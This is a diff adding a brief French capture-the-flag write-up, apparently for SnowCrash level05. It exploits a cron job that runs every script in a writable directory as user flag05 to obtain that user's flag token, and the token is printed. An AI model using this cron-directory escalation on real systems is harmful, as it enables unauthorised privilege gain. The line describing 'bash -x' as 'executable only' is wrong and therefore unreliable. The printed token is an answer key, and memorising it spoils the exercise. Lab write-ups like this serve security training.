@@ -1,0 +1,24 @@
+#find / -name *05* 2>/dev/null
+/var/mail/level05 
+
+#cat /var/mail/level05
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+- Un cron qui s'effectue toutes les 2min, su flag05 : effectue avec l'user flag05, -c : la commande passee en param soit le binaire openarenaserver
+
+#cat /usr/sbin/openarenaserver 
+"#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+        (ulimit -t 5; bash -x "$i")
+        rm -f "$i"
+done"
+
+- for i in /dossier/* ; do : itere a travers tous les fichiers contenu dans le dossier et les place dans la variable $i
+- bash -x "$i"  : execute les fichier place dans la var $i (-x : executable only)
+
+#echo "getflag > /tmp/flag" > /opt/openarenaserver/getflag 
+on place un binaire executant getflag dans le repertoire ou s'execute le cron, on place le resultat dans un fichier que l'on met a un endroit ou flag05 a les droit d'ecriture
+
+#cat /tmp/flag
+Check flag.Here is your token : 
+viuaaale9huek52boumoomioc
